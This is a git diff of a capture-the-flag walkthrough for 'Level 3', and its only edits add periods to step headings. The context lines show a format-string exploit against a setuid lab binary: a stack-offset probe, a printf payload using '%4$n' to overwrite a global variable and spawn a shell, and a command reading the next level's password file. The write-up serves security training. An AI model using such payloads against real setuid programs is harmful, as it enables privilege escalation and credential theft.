@@ -1,12 +1,12 @@
 # Level 3 Walkthrough
 
-1. **Connect to the target machine**
+1. **Connect to the target machine.**
 
 	```bash
 	ssh level3@<vm-ip> -p 4242
 	```
 
-2. **Check the files**
+2. **Check the files.**
 
 	```bash
 	ls -l
@@ -18,7 +18,7 @@
 	-rwsr-s---+ 1 level3 users 5138 Mar  6  2016 level3
 	```
 
-3. **Test the binary**
+3. **Test the binary.**
 
 	```bash
 	./level3
@@ -27,13 +27,13 @@
 	It waits for input, echoes the input, and exits..
 
 
-4. **Copy the binary locally for analysis**
+4. **Copy the binary locally for analysis.**
 
 	```bash
 	scp -P 4242 level3@<vm-ip>:/home/user/level3/level3 .
 	```
 
-5. **Test the binary**
+5. **Test the binary.**
 
 	```bash
 	./level3
@@ -41,7 +41,7 @@
 
 	It echoes back our input.
 
-6. **Disassemble and inspect with Ghidra**
+6. **Disassemble and inspect with Ghidra.**
 
 	The vulnarable part:
 
@@ -52,7 +52,7 @@
 	}
 	```
 
-7. **Check binary in GDB for variables**
+7. **Check binary in GDB for variables.**
 
 	```bash
 	gdb level3
@@ -67,7 +67,7 @@
 
 	This means `m` is a global variable at address `0x0804988c`.
 
-8. **Find our argument position in the stack**
+8. **Find our argument position in the stack.**
 
 	```bash
 	echo "AAAA %x %x %x %x" | ./level3
@@ -81,7 +81,7 @@
 
 	Our "AAAA" appears in the **4th** position on the stack.
 
-9. **Build and run the payload**
+9. **Build and run the payload.**
 
 	```bash
 	(printf '\x8c\x98\x04\x08'; printf 'A%.0s' {1..60}; echo '%4$n'; cat) | ./level3
@@ -94,7 +94,7 @@
 	Wait what?!
 	```
 
-10. **Confirm shell and escalate**
+10. **Confirm shell and escalate.**
 
 	```bash
 	whoami
@@ -106,7 +106,7 @@
 	level4
 	```
 
-11. **Read the password**
+11. **Read the password.**
 
 	```bash
 	cat /home/user/level4/.pass
